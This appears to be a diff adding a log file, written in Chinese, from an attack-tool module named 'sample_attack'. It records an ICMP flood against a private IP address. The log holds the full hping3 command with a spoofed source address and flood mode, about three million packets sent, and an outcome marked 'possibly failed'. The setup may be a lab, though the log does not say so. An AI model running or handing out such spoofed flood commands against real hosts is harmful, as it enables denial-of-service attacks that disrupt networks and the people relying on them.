@@ -1,0 +1,17 @@
+模組：sample_attack
+目標IP：192.168.22.22
+封包數：-1
+結果：可能失敗
+時間：20250609_214220
+
+[hping3] 發動 ICMP 攻擊至 192.168.22.22，模式：Flood
+[hping3] 執行指令：sudo hping3 192.168.22.22 --icmp -a 192.168.142.196 --flood
+[hping3] hping in flood mode, no replies will be shown
+[hping3] 收到停止請求，正在終止攻擊...
+[hping3] 
+[hping3] --- 192.168.22.22 hping statistic ---
+[hping3] 3086232 packets transmitted, 0 packets received, 100% packet loss
+[hping3] round-trip min/avg/max = 0.0/0.0/0.0 ms
+[hping3] HPING 192.168.22.22 (eth0 192.168.22.22): icmp mode set, 28 headers + 0 data bytes
+[hping3] 攻擊結束，返回碼：1
+[結果] 攻擊結果：可能失敗
